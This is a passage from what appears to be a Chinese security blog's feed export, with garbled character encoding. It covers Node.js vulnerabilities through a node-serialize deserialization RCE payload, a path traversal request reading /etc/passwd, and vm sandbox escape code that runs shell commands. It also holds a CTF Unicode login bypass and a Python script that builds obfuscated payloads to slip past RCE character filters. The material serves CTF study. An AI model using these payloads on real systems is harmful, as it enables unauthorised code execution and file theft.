node-serialize@0.0.4</code>å®‰è£…æ¨¡å—ã€‚</p><p><strong>äº†è§£ä»€ä¹ˆæ˜¯IIFEï¼š</strong></p><p>IIFE(ç«‹å³è°ƒç”¨å‡½æ•°è¡¨è¾¾å¼)æ˜¯ä¸€ä¸ªåœ¨å®šä¹‰æ—¶å°±ä¼šç«‹å³æ‰§è¡Œçš„ JavaScript å‡½æ•°ã€‚</p><p>IIFEä¸€èˆ¬å†™æˆä¸‹é¢çš„å½¢å¼ï¼š</p><pre><code>(function()&#123; /* code */ &#125;());// æˆ–è€…(function()&#123; /* code */ &#125;)();</code></pre><ul><li><code>node-serialize@0.0.4</code>æ¼æ´ç‚¹</li></ul><p>æ¼æ´ä»£ç ä½äºnode_modules\node-serialize\lib\serialize.jsä¸­ï¼š</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/aDr6o823Ux4F5Zw.png" alt="serialize_eval.png"></p><p>å…¶ä¸­çš„å…³é”®å°±æ˜¯ï¼š<code>obj[key] = eval(&#39;(&#39; + obj[key].substring(FUNCFLAG.length) + &#39;)&#39;);</code>è¿™ä¸€è¡Œè¯­å¥ï¼Œå¯ä»¥çœ‹åˆ°ä¼ é€’ç»™evalçš„å‚æ•°æ˜¯ç”¨æ‹¬å·åŒ…è£¹çš„ï¼Œæ‰€ä»¥å¦‚æœæ„é€ ä¸€ä¸ª<code>function()&#123;&#125;()</code>å‡½æ•°ï¼Œåœ¨ååºåˆ—åŒ–æ—¶å°±ä¼šè¢«å½“ä¸­IIFEç«‹å³è°ƒç”¨æ‰§è¡Œã€‚æ¥çœ‹å¦‚ä½•æ„é€ payloadï¼š</p><p><strong>æ„é€ Payload</strong></p><pre><code class="javascript">serialize = require(&#39;node-serialize&#39;);var test = &#123; rce : function()&#123;require(&#39;child_process&#39;).exec(&#39;ls /&#39;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;,&#125;console.log(&quot;åºåˆ—åŒ–ç”Ÿæˆçš„ Payload: \n&quot; + serialize.serialize(test));</code></pre><p>ç”Ÿæˆçš„Payloadä¸ºï¼š</p><pre><code class="javascript">&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(&#39;child_process&#39;).exec(&#39;ls /&#39;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;&quot;&#125;</code></pre><p>å› ä¸ºéœ€è¦åœ¨ååºåˆ—åŒ–æ—¶è®©å…¶ç«‹å³è°ƒç”¨æˆ‘ä»¬æ„é€ çš„å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨ç”Ÿæˆçš„åºåˆ—åŒ–è¯­å¥çš„å‡½æ•°åé¢å†æ·»åŠ ä¸€ä¸ª<code>()</code>ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><pre><code class="javascript">&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(&#39;child_process&#39;).exec(&#39;ls /&#39;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()&quot;&#125;</code></pre><p>(è¿™é‡Œä¸èƒ½ç›´æ¥åœ¨å¯¹è±¡å†…å®šä¹‰IIFEè¡¨è¾¾å¼ï¼Œä¸ç„¶ä¼šåºåˆ—åŒ–å¤±è´¥)</p><p>ä¼ é€’ç»™unserialize(æ³¨æ„è½¬ä¹‰å•å¼•å·)ï¼š</p><pre><code class="javascript">var serialize = require(&#39;node-serialize&#39;);var payload = &#39;&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(\&#39;child_process\&#39;).exec(\&#39;ls /\&#39;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()&quot;&#125;&#39;;serialize.unserialize(payload);</code></pre><p>æ‰§è¡Œå‘½ä»¤æˆåŠŸï¼Œç»“æœå¦‚å›¾ï¼š</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/V1hOMYz7fQ3KB6X.png" alt="serialize_result.png"></p><h1 id="Node-js-ç›®å½•ç©¿è¶Šæ¼æ´å¤ç°-CVE-2017-14849"><a href="#Node-js-ç›®å½•ç©¿è¶Šæ¼æ´å¤ç°-CVE-2017-14849" class="headerlink" title="Node.js ç›®å½•ç©¿è¶Šæ¼æ´å¤ç°(CVE-2017-14849)"></a>Node.js ç›®å½•ç©¿è¶Šæ¼æ´å¤ç°(CVE-2017-14849)</h1><p>æ¼æ´å½±å“çš„ç‰ˆæœ¬ï¼š</p><ul><li>Node.js 8.5.0 + Express 3.19.0-3.21.2</li><li>Node.js 8.5.0 + Express 4.11.0-4.15.5</li></ul><p>è¿è¡Œæ¼æ´ç¯å¢ƒï¼š</p><pre><code>cd vulhub/node/CVE-2017-14849/docker-compose builddocker-compose up -d</code></pre><p>ç”¨Burpsuiteè·å–åœ°å€ï¼š<code>/static/../../../a/../../../../etc/passwd</code> å³å¯ä¸‹è½½å¾—åˆ°<code>/etc/passwd</code>æ–‡ä»¶</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/L8pV6gXoAnJSRQ4.png" alt="node_dir.png"></p><h1 id="vmæ²™ç®±é€ƒé€¸"><a href="#vmæ²™ç®±é€ƒé€¸" class="headerlink" title="vmæ²™ç®±é€ƒé€¸"></a>vmæ²™ç®±é€ƒé€¸</h1><p>vmæ˜¯ç”¨æ¥å®ç°ä¸€ä¸ªæ²™ç®±ç¯å¢ƒï¼Œå¯ä»¥å®‰å…¨çš„æ‰§è¡Œä¸å—ä¿¡ä»»çš„ä»£ç è€Œä¸ä¼šå½±å“åˆ°ä¸»ç¨‹åºã€‚ä½†æ˜¯å¯ä»¥é€šè¿‡æ„é€ è¯­å¥æ¥è¿›è¡Œé€ƒé€¸ï¼š</p><p>é€ƒé€¸ä¾‹å­ï¼š</p><pre><code>const vm = require(&quot;vm&quot;);const env = vm.runInNewContext(`this.constructor.constructor(&#39;return this.process.env&#39;)()`);console.log(env);</code></pre><p>æ‰§è¡Œä¹‹åå¯ä»¥è·å–åˆ°ä¸»ç¨‹åºç¯å¢ƒä¸­çš„ç¯å¢ƒå˜é‡</p><p>ä¸Šé¢ä¾‹å­çš„ä»£ç ç­‰ä»·äºå¦‚ä¸‹ä»£ç ï¼š</p><pre><code>const vm = require(&#39;vm&#39;);const sandbox = &#123;&#125;;const script = new vm.Script(&quot;this.constructor.constructor(&#39;return this.process.env&#39;)()&quot;);const context = vm.createContext(sandbox);env = script.runInContext(context);console.log(env);</code></pre><p>åˆ›å»ºvmç¯å¢ƒæ—¶ï¼Œé¦–å…ˆè¦åˆå§‹åŒ–ä¸€ä¸ªå¯¹è±¡ sandboxï¼Œè¿™ä¸ªå¯¹è±¡å°±æ˜¯vmä¸­è„šæœ¬æ‰§è¡Œæ—¶çš„å…¨å±€ç¯å¢ƒcontextï¼Œvm è„šæœ¬ä¸­å…¨å±€ this æŒ‡å‘çš„å°±æ˜¯è¿™ä¸ªå¯¹è±¡ã€‚</p><p>å› ä¸º<code>this.constructor.constructor</code>è¿”å›çš„æ˜¯ä¸€ä¸ª<code>Function constructor</code>ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨Functionå¯¹è±¡æ„é€ ä¸€ä¸ªå‡½æ•°å¹¶æ‰§è¡Œã€‚(æ­¤æ—¶Functionå¯¹è±¡çš„ä¸Šä¸‹æ–‡ç¯å¢ƒæ˜¯å¤„äºä¸»ç¨‹åºä¸­çš„) è¿™é‡Œæ„é€ çš„å‡½æ•°å†…çš„è¯­å¥æ˜¯<code>return this.process.env</code>ï¼Œç»“æœæ˜¯è¿”å›äº†ä¸»ç¨‹åºçš„ç¯å¢ƒå˜é‡ã€‚</p><p>é…åˆ<code>chile_process.exec()</code>å°±å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤äº†ï¼š</p><pre><code>const vm = require(&quot;vm&quot;);const env = vm.runInNewContext(`const process = this.constructor.constructor(&#39;return this.process&#39;)();process.mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString()`);console.log(env);</code></pre><p>æœ€è¿‘çš„mongo-express RCE(CVE-2019-10758)æ¼æ´å°±æ˜¯é…åˆvmæ²™ç®±é€ƒé€¸æ¥åˆ©ç”¨çš„ã€‚</p><p>å…·ä½“åˆ†æå¯å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/7056">CVE-2019-10758:mongo-expressRCEå¤ç°åˆ†æ</a></p><h1 id="javascriptå¤§å°å†™ç‰¹æ€§"><a href="#javascriptå¤§å°å†™ç‰¹æ€§" class="headerlink" title="javascriptå¤§å°å†™ç‰¹æ€§"></a>javascriptå¤§å°å†™ç‰¹æ€§</h1><p>åœ¨javascriptä¸­æœ‰å‡ ä¸ªç‰¹æ®Šçš„å­—ç¬¦éœ€è¦è®°å½•ä¸€ä¸‹</p><p>å¯¹äºtoUpperCase():</p><pre><code>å­—ç¬¦&quot;Ä±&quot;ã€&quot;Å¿&quot; ç»è¿‡toUpperCaseå¤„ç†åç»“æœä¸º &quot;I&quot;ã€&quot;S&quot;</code></pre><p>å¯¹äºtoLowerCase():</p><pre><code>å­—ç¬¦&quot;â„ª&quot;ç»è¿‡toLowerCaseå¤„ç†åç»“æœä¸º&quot;k&quot;(è¿™ä¸ªâ„ªä¸æ˜¯K)</code></pre><p>åœ¨ç»•ä¸€äº›è§„åˆ™çš„æ—¶å€™å°±å¯ä»¥åˆ©ç”¨è¿™å‡ ä¸ªç‰¹æ®Šå­—ç¬¦è¿›è¡Œç»•è¿‡</p><p><strong>CTFé¢˜å®ä¾‹ - Hacktmä¸­çš„ä¸€é“Nodejsé¢˜</strong></p><p>é¢˜ç›®éƒ¨åˆ†æºç ï¼š</p><pre><code class="javascript">function isValidUser(u) &#123;  return (    u.username.length &gt;= 3 &amp;&amp;    u.username.toUpperCase() !== config.adminUsername.toUpperCase()  );&#125;function isAdmin(u) &#123;  return u.username.toLowerCase() == config.adminUsername.toLowerCase();&#125;</code></pre><p>è§£é¢˜æ—¶éœ€è¦ç™»å½•ç®¡ç†å‘˜çš„ç”¨æˆ·åï¼Œä½†æ˜¯åœ¨ç™»å½•æ—¶ï¼Œ<code>isValidUser</code>å‡½æ•°ä¼šå¯¹ç”¨æˆ·è¾“å…¥çš„ç”¨æˆ·åè¿›è¡Œ<code>toUpperCase</code>å¤„ç†ï¼Œå†ä¸ç®¡ç†å‘˜ç”¨æˆ·åè¿›è¡Œå¯¹æ¯”ã€‚å¦‚æœè¾“å…¥çš„ç”¨æˆ·åä¸ç®¡ç†å‘˜ç”¨æˆ·åç›¸åŒï¼Œå°±ä¸å…è®¸ç™»å½•ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåœ¨ä¹‹åçš„ä¸€ä¸ªåˆ¤æ–­ç”¨æˆ·æ˜¯å¦ä¸ºç®¡ç†å‘˜çš„å‡½æ•°ä¸­ï¼Œå¯¹ç”¨æˆ·åè¿›è¡Œå¤„ç†çš„æ˜¯<code>toLowerCase</code>ã€‚æ‰€ä»¥è¿™ä¸¤ä¸ªå·®å¼‚ï¼Œå°±å¯ä»¥ä½¿ç”¨å¤§å°å†™ç‰¹æ€§æ¥è¿›è¡Œç»•è¿‡ã€‚</p><p>é¢˜ç›®ä¸­é»˜è®¤çš„ç®¡ç†å‘˜ç”¨æˆ·åä¸ºï¼šhacktm</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬æŒ‡å®šç™»å½•æ—¶çš„ç”¨æˆ·åä¸ºï¼šhacâ„ªtm å³å¯ç»•è¿‡<code>isValidUser</code>å’Œ<code>isAdmin</code>çš„éªŒè¯ã€‚</p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> å¸¸è§æ¼æ´å’Œæ‰‹æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rceå¸¸ç”¨è„šæœ¬</title>
      <link href="/2022/04/12/rce%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC/"/>
      <url>/2022/04/12/rce%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p>å¾ˆå¥½ç”¨ï¼Œå„ç§ç»•è¿‡å§¿åŠ¿</p><pre><code class="python">from typing import finalimport stringdef realHex(num):    if num &lt;16:        return &quot;%0&quot;+hex(num)[2:]    else:        return &#39;%&#39;+hex(num)[2:]pattern=input(&quot;è¯·è¾“å…¥æ­£åˆ™è¿‡æ»¤å¼,æ²¡æœ‰åˆ™ç›´æ¥å›è½¦è·³è¿‡\n&quot;)#æ­£åˆ™è¡¨è¾¾å¼ä¿®é¥°ç¬¦re.Iå¤§å°å†™ä¸æ•æ„Ÿ,re.Må¤šè¡ŒåŒ¹é…,å½±å“^å’Œ$,re.Sä½¿å¾—.åŒ¹é…åŒ…æ‹¬æ¢è¡Œåœ¨å†…çš„æ‰€æœ‰å­—ç¬¦,re.Uæ ¹æ®Unicodeå­—ç¬¦é›†è§£æå­—ç¬¦,å½±å“\w,\W,\b,\B#å»ºè®®å›è½¦è·³è¿‡,è¿™ä¸ªåŠŸèƒ½å¾ˆé€Šif pattern != &quot;&quot;:    import re    blacklist=[&quot;`&quot;,&quot;&#39;&quot;,&#39;&quot;&#39;,&quot;\\&quot;]    for i in range(32,255):        if  re.search(pattern,chr(i),re.I):            blacklist.append(chr(i))else:    #blackliståˆ—è¡¨ä¸­çš„å­—ç¬¦åœ¨ç”Ÿæˆçš„æ‹¼æ¥å­—ç¬¦ä¸²ä¸­ä¸ä¼šè¢«ä½¿ç”¨,é™¤äº†éƒ¨åˆ†æ˜¯è¢«è¿‡æ»¤æ‰çš„å­—ç¬¦ï¼Œå…¶ä½™çš„å¦‚&#39;,&quot;ç­‰å­—ç¬¦è€ƒè™‘å¯èƒ½ä¼šå¯¼è‡´é—­åˆç­‰é—®é¢˜æš‚åˆ—å…¥    #å¦‚æœæœ‰å…¶ä»–çš„è¦æ±‚å¯ä»¥å¯¹blackliståˆ—è¡¨è¿›è¡Œåˆ æ”¹    #!æ³¨æ„å¯¹äº|å’Œ&amp;æ¥è¯´æ‹¼å‡‘å­—ç¬¦æ˜¯ç›¸å½“å›°éš¾çš„,å¹¶ä¸”å¯ç”¨èŒƒå›´å®é™…ä¸Šæ˜¯31-255,è¿™å°±å¯¼è‡´äº†è¦è¿™æ ·ç”¨å¿…é¡»å¼•å·åŒ…è£¹,å¦åˆ™å¤§æ¦‚ç‡GG    #æ¯”å¦‚&#123;,&#125;,;,|,&amp;,$ç­‰è¯¸å¤šç¬¦å·ä¸å¸¦å¼•å·ä¼šå¯¼è‡´æ— æ³•ä½¿ç”¨    blacklist=[]    for word in string.ascii_letters+string.digits:        blacklist.append(word)    blacklist+=[&quot; &quot;,&quot;^&quot;,&quot;~&quot;,&quot;|&quot;,&quot;&#39;&quot;,&#39;&quot;&#39;,&quot;\\&quot;]#print(blacklist)#ä¸åŒäºå–å,ä¸€ä¸ªç›®æ ‡å­—ç¬¦ä¸²ä½¿ç”¨å¼‚æˆ–çš„æ–¹å¼å¯ä»¥è·å¤§é‡çš„å¯ç”¨æ‹¼æ¥å­—ç¬¦ä¸²,è¿™é‡Œåªå–äº†1ç§ç»„åˆçš„æ‹¼æ¥å­—ç¬¦ä¸²#å¦‚æœéœ€è¦è·å¾—æ›´å¤šæ‹¼æ¥å­—ç¬¦ä¸²æŸ¥çœ‹è¯¥å‡½æ•°ä¸­çš„resultåˆ—è¡¨def yiHuo(string):    global operationEffient    global blacklist    operationEffient=False    result=[]    finalstr=&#39;&quot;&quot;^&quot;&quot;&#39;    rawstr=string    for i in range(0,len(rawstr)):        result.extend([[]])    for k in range(0,len(rawstr)):        #è¿™é‡Œæ›´æ¢èŒƒå›´        for i in range(1,255):           if(chr(i) not in blacklist):               #è¿™é‡Œæ›´æ¢èŒƒå›´                for j in range(1,255):                    if(chr(j) not in blacklist):                        if(i^j==ord(rawstr[k]) and [hex(j).replace(&#39;0x&#39;,&quot;%&quot;),hex(i).replace(&#39;0x&#39;,&quot;%&quot;)] not in result[k]):                            result[k].extend([[realHex(i),realHex(j)]])    #åœ¨è¿™é‡Œå¾€ä¸‹çš„å‡½æ•°éƒ¨åˆ†,resultåˆ—è¡¨å‡æ˜¯å¯ç”¨çš„(å·²å¡«å……äº†è·å¾—çš„æ‹¼æ¥å­—ç¬¦ä¸²)    for i in range(0,len(result)):        if(len(result[i])==0):            return(&quot;è¯¥å­—ç¬¦åœ¨ç°æœ‰é»‘åå•å’Œå­—ç¬¦èŒƒå›´ä¸‹æ— æ³•æ‹¼æ¥å‡º-&gt;%s&quot;%(rawstr[i]))    for i in range(0,len(rawstr)):        finalstr=finalstr[:finalstr.find(&quot;^&quot;,0)-1]+result[i][0][0]+&#39;&quot;&#39;+finalstr[finalstr.find(&quot;^&quot;,0):]        finalstr=finalstr[:finalstr.rfind(&quot;&#39;&quot;,0)]+result[i][0][1]+finalstr[finalstr.rfind(&#39;&quot;&#39;,0):]    return finalstrdef quFan(string):    global operationEffient    global blacklist    operationEffient=False    result=[]    finalstr=&#39;~&quot;&quot;&#39;    rawstr=string    for i in range(0,len(rawstr)):        result.extend([[]])    for k in range(0,len(rawstr)):        #è¿™é‡Œæ›´æ¢èŒƒå›´        for i in range(1,255):           if(chr(i) not in blacklist and chr(int(bin(~i &amp; 0xFF)[2:],2))==rawstr[k]):               result[k].extend([realHex(i)])    #print(result)    for i in range(0,len(result)):        if(len(result[i])==0):            return(&quot;è¯¥å­—ç¬¦åœ¨ç°æœ‰é»‘åå•å’Œå­—ç¬¦èŒƒå›´ä¸‹æ— æ³•æ‹¼æ¥å‡º-&gt;%s&quot;%(rawstr[i]))    for i in range(0,len(rawstr)):        finalstr=finalstr[:finalstr.rfind(&#39;&quot;&#39;,0)]+result[i][0]+finalstr[finalstr.rfind(&#39;&quot;&#39;,0):]    return finalstrdef rce_and(string):    global operationEffient    global blacklist    operationEffient=False    rawstring=string    result=[]    finalstr=&quot;&quot;    for i in range(0,len(rawstring)):        result.extend([[]])    for l in range(0,len(rawstring)):        for i in range(1,255):            for j in range(1,255):                if (chr(j) in blacklist) or (chr(i) in blacklist):                    continue                if chr(i&amp;j)==rawstring[l]:                    #æ³¨æ„&amp;åœ¨URLç‰¹æ®Šå«ä¹‰,æ•…éœ€è¦URLç¼–ç                     result[l].append(&quot;\&quot;&quot;+realHex(i)+&quot;\&quot;%26\&quot;&quot;+realHex(j)+&quot;\&quot;&quot;)                    continue    for i in range(0,len(result)):        if(len(result[i])==0):            print(&quot;è¯¥å­—ç¬¦åœ¨ç°æœ‰é»‘åå•å’Œå­—ç¬¦èŒƒå›´ä¸‹æ— æ³•æ‹¼æ¥å‡º-&gt;%s&quot;%(rawstring[i]))            return    for i in range(0,len(result)):        if i == 0:            finalstr+=&quot;(&#123;&#125;)&quot;.format(result[i][0])        else:            finalstr+=&quot;.(&#123;&#125;)&quot;.format(result[i][0])    return finalstrdef rce_or(string):    global operationEffient    global blacklist    operationEffient=False    rawstring=string    result=[]    finalstr=&quot;&quot;    for i in range(0,len(rawstring)):        result.extend([[]])    for l in range(0,len(rawstring)):        for i in range(1,255):            for j in range(1,255):                if (chr(j) in blacklist) or (chr(i) in blacklist):                    continue                if chr(i|j)==rawstring[l]:                    result[l].append(&quot;\&quot;&quot;+realHex(i)+&quot;\&quot;|\&quot;&quot;+realHex(j)+&quot;\&quot;&quot;)                    continue    for i in range(0,len(result)):        if(len(result[i])==0):            print(&quot;è¯¥å­—ç¬¦åœ¨ç°æœ‰é»‘åå•å’Œå­—ç¬¦èŒƒå›´ä¸‹æ— æ³•æ‹¼æ¥å‡º-&gt;%s&quot;%(rawstring[i]))            return    for i in range(0,len(result)):        if i == 0:            finalstr+=&quot;(&#123;&#125;)&quot;.format(result[i][0])        else:            finalstr+=&quot;.(&#123;&#125;)&quot;.format(result[i][0])    return finalstrwhile(True):    operationEffient=True    target=input(&quot;è¯·è¾“å…¥å¾…è½¬æ¢å­—ç¬¦\n&quot;)    while(operationEffient):        operation=input(&quot;è¯·é€‰æ‹©æ“ä½œ\n0-&gt;é‡æ–°è¾“å…¥\n1-&gt;ä½¿ç”¨å¼‚æˆ–æ‹¼æ¥\n2-&gt;ä½¿ç”¨å–åè·å¾—\n3-&gt;ä½¿ç”¨äºŒè¿›åˆ¶å’Œ\n4-&gt;ä½¿ç”¨äºŒè¿›åˆ¶æˆ–\n&quot;)        if(operation==&quot;1&quot;):            result=yiHuo(target)            pass        elif(operation==&quot;2&quot;):            result=quFan(target)            pass        elif(operation==&#39;3&#39;):            result=rce_and(target)            pass        elif(operation==&#39;4&#39;):            result=rce_or(target)            pass        elif(operation==&quot;0&quot;):            break        else:            print(&quot;é€‰æ‹©çš„æ“ä½œæ— æ•ˆ&quot;)            continue        if result!=&#39;&#39;:            print(result)</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> è„šæœ¬ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>timeline secæ–°äººèµ›</title>
      <link href="/2022/04/11/timeline-sec%E6%96%B0%E4%BA%BA%E8%B5%9B/"/>
      <url>/2022/04/11/timeline-sec%E6%96%B0%E4%BA%BA%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="428e54a308c76cc06c7c2d72cf4499a827fc0118fcc10fae0cb9da6413e54d4d">329582d599d3308dd96c6b56d6bc1f822d06e9b899f44b25299bc2af72884e3d1abc9a4cd96e9c064d8877009252c5c8bcd41a7c27c6f8cf9a1e6130ca81228bdd9144fcf6846357a0c9d8613dcc392ecd3e717b8255092600bbf3f8d419080ed19a0846c44b23d901695644a103dccbc7497f4e6c767353ae14186ad319c9b10e346c6cb43e9b166bbc9460c4e81469b3eb647c6f7c9d73d32bfa139c259acfa805a31f9d5b268e0fc2d9dfecaca20e3159320fa37c99e5fe4ae174f454076e37b7e8060543ed6230a0cba0ee606e767a8a2dd902b2002b8a5be1729059d7a60bc517f8b4b6872eedb845107d7d09225ee136f571fe30e8a7544f4ab403b709e817759b736d015bbe2cc3e05bf0d89c627a8d00c3bb26f0fcc5386e6b7d7b5a236521d2b573c195e794a16974c995ccd1c511a60c0c919f8441e72ab4f5b9bd0a3d7f61076519ced1f9d9b2f521c925d5ef0080d88a41a212b5845108f2f88e01a03801c34b02a248e4daaf3e66df8ec5d93408136c89108c28ea5197198e8559b00cb948609a6cf418b1f4d7e8f9351ddf07d42df8382012f70f0877f112b2dd6a3b19fa80f104594b666a0e8cd541fad67df3828af720d60ab4e349b4b50c787a00d72d0008bf427ce2cc8e7f9c93fa28e309fca535d81ce5c9128d04e820c25c26d47ff59a726a6ec4dfb77e600a6ea1aae2155b1a881d64ef30d6868f28d2a516fb6a18a9013c012da9237487789d3e53731102f7a597070ef37ac49509ccf338144026af8e4f5943f708f7506145e46cab8f0947a199b1a1ba2210c8d7f468a0a62780cdbc1ca48ff4bce9dd2578d824dddc8c76ebce493d105b12bea66025995b2138e7357cfd97a8fa2016e25eb95230de7e3f9af4cf664f1b7579a26600a6c11560343b9619a1488af1daa6dd17098ccaf0a595e53e519f4820c7419b75ebdc7be32f0c5deb67b219f760de5e31fe60b66771c96d0036453a20c467b1d29194acc4ef5a39f751591ef328a4bdde6484ae80f925c6892ff2d0ff58edf291bc5830868791762749d43c114ac5f125b95eccca40b872cd517651dc52a9cefccf31398447e2788705bb9799750ac2aa4fa6b715435bb8efcb59bae5d787156d7dcc8340fff81bef5a80e6ce42d1fbfddfc8776b8243e4da8c8af7a86f08f97334513a311a27e803e0b9b8472c92603595a726c9f058fff54d544ff8d10e7618616eefe8239f0df69fd773c2148a9ec6f4d8e2f4d26fea86a116e329a40af27786cea6f5c878078476f1dc4b58ccd22b42eaa582362f7853a41a00cbb3c57863b808e393e3af80139d21109706c7f5ab07f33619d6493ef47cc96bb7a4f6b7c7782003d96ac9191f55dc7983d36e53a2aaaaccc48cd18394a46999f9f97d12500b16227fd2d43242319a8cd83a8d05ffba1517144f3e8877b1090ff0e94fcd615f26355f7b9dc11c8aff59a886abe67aa90e2dd2b10d9cc28a2ed8609f8ee8f1c592a518c515e167ade2509194c77b4efaa3c13918404a65b97e929a272e733808bd07647d8acc02efc40c8ae8dd6310f778391373e7004b00cbd0fc39601b60c4059c1bdfbf475b2ca5354a11740d482ad51d7a07a1e8677c8cb54dfa39069a9425f3e4d61df8786e6f06d04311c5b9a56e658f2b187ce5b0ade9439e9134000c8265f5e7b99e3953c6061c10c48fc8e1e515886edbcbf2e3dde8d66dcaab6fa9386c23326c78ff0fff8546e768ceba3a19df40338eae6a57e79a09ee1d83b74dcf7e0e77a47cb38f279ad4262fe20045fdb62f37d6005bb1a34f7fab0e339f3952b747926c8019c9f53926a96b4adddd1699920fbb29a5acfeddb676dc0d946bf12ad2eaf7eb86284cb3e477648eebedb8f05b35e58aa0343be98ac87f485d5279b0c592ffae6545d7a3676f4da3fea3e3d4c7b0f8f4b44971702a9ab6ba91153879349f7d66f161345f082bc20be3ba21255d1c70df472f6990fbdc8dc273a950d14db7553d3d0125710d06ef35ef9dbf785466cb33e31fa0d94e361f106586bcbd56ac948fd7fdadecf8a586312212d01c5080791c9ef7c800cd781a41936231108f915a971112c3ca18343f237fba3a45830252d9d6d1fa4cf7a29851f24e605526ac900eaf68ca1d5209064982bd11f31255e42699be684e241a7c0648624ece30150ba54b91af2e5d052ddf157a3ab9ecfd3ffaebf5c6e99179efaae43d10746ab697e6cc3a04927ecd1068718e02cde5229d9684d39fca866c9fcfb568a8c5270573762b8e9b2925d235d2aa0a7208f2a4d90788585914bce49be77447a6d3a2efd5a285316a0002c9d55f65e4a3d3a96c4439ccd7202fac0f0cd3a46bfd4bb70f07722b83c8b7a112db0d10e5c9d0aa8a5f8578bd224197f3ac0e9a49cbee7c239901bd49c938ea16a4da2f76972cde91e5cab429c3ed5b0897a8e889cc3968e22c4b656a90eaee5d2a7836d42b55eaedc8c6f72880816f09acb582b5352a0171f90513913ba94534d144f597a1b91ef248c625f526fbcc8f7f7cbc136dba515cdcc4970761fb39129a1713b32c76a4677af646c2aa13d2a87469f387e080bc9b0f83454c165e9b043b26fa8ead3b4070303aea73737084d07146e8e66cb18efd71dd1cd3043638b0317a941cc44f409acb7bf8a3213d8ce2b6290b73058394862242583fb2a56571a0f0b7a0241cbd547f5527476cf3b0c92bd04fb4967259a40f5773550a7c80047be30e4bd61eed384d21db5e1ea0eda8eb572dfc8c5ad75eb52330e320e087478cf2cee5de6afd0cd1c481073df5592651d3d441c455d57adfa2cc63b508f1dd26d08fb5e73ece1fd881907886a83d9b4b924a0ba8499a743f38e9a72aa2c3086a4376fc7348c395c489ca1b7792d10ecf2069ca1c404fe5cd3e9ee094927bbb8a9f02b4213f387e02b0891734ca4228a0369ecd9bfa70367b5103651aaa76e5da29297e661b7b0d9ec90b4bc6512c49107a07f07590c8d68a4f0af61333b6406fa03dc9ebb3ab6843ac965f90441113a54c6c13793d218774e3f09099cef9e33a9fc20220cd663343f8f1105e6cdca8ab479e9c511a4e56499026ce27c1b747001e42fff9430d6ee857de9d427f476d022fe462f9dddfa652586b5995cd6a111557eed0f770b743aee17d7f3f50196d803f6ff4daae6ce3d0f9ac0e50e5284993c5556b971c1f2b17d0303453f93f1fddb5cd541d374a045748d7b8776dc9f606ae358887b6d6b90f23348b0d57458364d2ecd76474364278a2b1fce7fb7ffff10800082d0b9fedbab82039f3ba1ba680958813407ed288f07b04be926f653f3303947de3b7eca127668a8f267e14bed5c6272d45cf50c76e70de24e24aee576c5c5401c89f5ebe9cff81125cad6599da3624b046e2acde0a0b7f615449905d17dff132c6b1b2583b1a56f9350a0cb995f7b32ed68367a489baabf213f21d058550725d83ab3f909ef3187b6f89ef0b9d2852cef01ce66f95f66ea5e67eecf854f1f45f841891242dddf616dc03b1946df3913b393ee44c8c18d982dcb1308af2e10786198f7969aaa76d91f34b43eb964a74513294c3e3f80ba31686fa4c2f03b5b30ea63b6b6ed50c4785d398f4c81da113b532de964ce0bf306ee7a3f6455091b5c8ff27e6b4128fbb83c5383d2401ce14a7146f63e268b179ac196bee7b3ae3b047a940ac5d3343dd375aa4ac98945d7efd83203348d6d2f3992674334196892c32ff83396d52a91adc74fd94cea277b95916f68663865cdd3bee1d7641e5531ab4a5c5d386d1ade07514eba377bddfd5403e9cc6091ed9e47428aa0d52d04b0857ae6d70477f407c96f673412d99d03d98417dc42d593d644e96dc293161f94a4dbce11db5098fab92e688cfd41e9667085841c535e2a48e9eff907bf3e0cac0d02c363d4611b37c073aaf6d50dc09eeaa3f92cde008c21e2068aafb836e0d07ad37cbd347207045eb0932decb06f5942eb0436ac38590be747853f8093240c3df86770c212bb59f91fddde1fe1538dd5f07542b5c62ae124a95604eb630068809c472c6ce8260c4ef28d01f8bb45cf7bee33e94d69a10f5f1d3c1104f6e74a1703ac851e2c4e327c5b6a7c6ec7f18a09359efcc50342147b4527324672921c0847224c04c64f04e5f3370346cbf258eb07a12b3248fad6781c927fb04e66ace5f6ec20bc111cf276dbaac52be64ec3ffac93fff6adadf21fafaad872a55f24cb3325438002287b53a5417563fb41b002f5ed7ad9226f637d148b6c49beda61608c954d86d5fd41550b63510ce0f6f947e22d6d9d839c13d01b02ab